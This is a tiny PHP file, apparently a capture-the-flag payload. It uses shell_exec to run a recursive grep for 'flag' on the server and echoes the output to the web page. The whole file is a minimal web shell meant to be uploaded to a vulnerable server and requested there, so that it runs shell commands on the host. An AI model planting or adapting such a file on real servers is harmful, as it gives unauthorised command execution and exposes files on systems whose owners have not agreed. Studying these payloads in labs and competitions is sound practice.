<?php
$output = shell_exec("grep -r 'flag'");
echo "<pre>$output</pre>";
?>